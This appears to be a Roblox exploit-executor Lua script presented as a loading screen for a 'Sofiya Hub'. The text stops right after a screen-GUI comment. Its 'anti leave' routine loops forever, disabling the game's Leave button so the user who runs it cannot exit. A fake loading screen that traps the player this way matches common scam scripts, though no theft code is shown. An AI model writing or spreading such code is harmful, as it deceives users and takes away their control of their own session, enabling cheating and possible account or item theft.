--// SOFIYA HUB - RNG LOADING SCREEN

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer

--// ANTI LEAVE
task.spawn(function()
	while task.wait() do
		pcall(function()
			for _, v in ipairs(
				getconnections(
					game:GetService("CoreGui")
					.RobloxGui
					.SettingsClippingShield
					.SettingsShield
					.MenuContainer
					.Page
					.PageViewClipper
					.PageView
					.PageViewInnerFrame
					.LeaveGamePage
					.LeaveButtonsContainer
					.LeaveButtonsContainer
					.LeaveGameButton
					.Activated
				)
			) do
				v:Disable()
			end
		end)
	end
end)

--// REMOVE OLD LOADING GUI
local oldGui = player:WaitForChild("PlayerGui"):FindFirstChild("SofiyaHubLoading")
if oldGui then
	oldGui:Destroy()
end

--// SCREEN GUI
